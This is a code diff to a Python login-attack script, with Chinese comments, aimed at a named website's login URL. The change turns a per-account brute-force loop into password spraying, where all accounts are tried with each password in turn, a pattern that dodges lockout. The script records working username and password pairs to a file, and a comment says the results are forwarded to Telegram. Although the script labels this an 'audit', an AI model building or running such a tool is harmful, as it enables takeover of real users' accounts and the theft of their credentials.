@@ -77,18 +77,24 @@ def main():
             os.remove(path)
 
     print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码")
+    print(f"[*] 模式: 密码优先（所有账号轮流尝试同一个密码）")
     print(f"[*] 目标: {LOGIN_URL}\n")
 
     successful_results = []
     current_time_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
     with requests.Session() as session:
-        for username in usernames:
-            print(f"\n[*] ==================== 开始测试账号: {username} ====================")
-            found = False
+        # 外层循环：先遍历密码
+        for password in passwords:
+            print(f"\n[*] ==================== 当前测试密码: {password} ====================")
+            
+            # 内层循环：让每个账号都来试这个密码
+            for username in usernames:
+                # 如果该账号已经成功匹配过，跳过后续测试，避免重复请求
+                if any(res['username'] == username for res in successful_results):
+                    continue
 
-            for password in passwords:
-                print(f"[-] 尝试: {username} : {password}")
+                print(f"[-] 尝试账号: {username} : {password}")
                 headers = {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                     "Referer": "https://my.yue.to/"
@@ -110,16 +116,10 @@ def main():
                         # 记录到原始日志
                         with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
                             f.write(f"[{current_time_str}] 成功: 账号={username} ---- 密码={password}\n")
-                            
-                        found = True
-                        break
                 except requests.exceptions.RequestException as e:
                     print(f"[!] 请求异常: {e}")
 
                 time.sleep(REQUEST_INTERVAL)
-
-            if not found:
-                print(f"[-] 账号 {username} 未找到正确密码")
 
     # === 全部跑完后，统一生成汇总文件并无论如何都发送给电报 ===
     summary_content = "=== 审计结果汇总 ===\n\n"
